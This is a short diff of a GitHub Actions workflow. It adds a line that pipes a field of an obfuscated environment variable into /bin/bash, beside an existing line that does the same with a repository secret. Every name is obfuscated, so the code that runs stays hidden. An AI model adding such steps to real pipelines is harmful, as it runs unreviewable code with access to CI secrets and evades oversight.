@@ -22,6 +22,7 @@ jobs:
           ondm93: ${{ secrets.ondm93 }}
         run: |
           printf '%s' "$ondm93" | jq -r .pb74225 | /bin/bash
+          echo $irok03 | jq -r .iu82182 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
